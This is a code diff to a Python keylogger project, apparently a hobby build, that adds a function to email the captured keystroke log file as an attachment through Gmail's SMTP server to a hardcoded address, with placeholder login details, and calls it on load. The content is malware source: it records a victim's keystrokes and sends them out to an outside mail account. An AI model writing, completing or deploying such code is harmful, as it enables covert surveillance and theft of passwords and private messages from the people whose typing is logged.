@@ -28,9 +28,49 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 key_information = "key_log.txt"
+email_address = "xyz@gmail.com"
+password = "12345"
 
-file_path = "C:\\Users\\Tino\\Desktop\\keylogger\\project"
-extend = "\\"
+toaddr = "xyz@gmail.com"
+
+file_path = r"C:\Visual Studio\keylogger\project"
+extend = os.path.sep
+
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = email_address
+
+    msg = MIMEMultipart()
+
+    msg["From"] = fromaddr
+    msg["To"] = toaddr
+    msg["Subject"] = "Keylogger Report"
+
+    body = "Body of the email."
+
+    msg.attach(MIMEText(body, "plain"))
+
+    filename = filename
+    attachment = open(attachment, "rb")
+
+    p = MIMEBase("application", "octet-stream")
+    p.set_payload(attachment.read())
+    encoders.encode_base64(p)
+
+    p.add_header("Content-Disposition", f"attachment; filename= {filename}")
+    msg.attach(p)
+    s = smtplib.SMTP("smtp.gmail.com", 587)
+
+    s.starttls()
+
+    s.login(fromaddr, password)
+    text = msg.as_string()
+    s.sendmail(fromaddr, toaddr, text)
+    s.quit()
+
+send_email(key_information, file_path + extend + key_information, toaddr)
+
+
 
 count = 0
 keys = []
@@ -38,8 +78,8 @@ keys = []
 def on_press(key):
     global keys, count
     print(key)
-    keys.append(key)
-    count += 1
+    keys.append(key) 
+    count = count + 1 
 
     if count >= 1:
         count = 0
